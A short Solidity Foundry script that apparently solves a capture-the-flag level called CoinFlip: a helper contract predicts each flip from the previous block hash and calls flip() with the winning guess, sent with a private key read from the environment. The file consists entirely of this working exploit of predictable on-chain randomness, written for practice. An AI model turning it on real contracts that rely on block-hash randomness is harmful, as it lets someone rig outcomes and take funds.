// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level3.sol";
import "forge-std/Script.sol";

contract ExploitLevel3 is Script {
    CoinFlip instance = CoinFlip(0xEF4e4992db2A141d4a15CB284aA32E616d7FE5C6);

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        new Player(instance);
        console.log("Flip guessed:", instance.consecutiveWins());
    }
}

contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip instance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        instance.flip(side);
    }
}
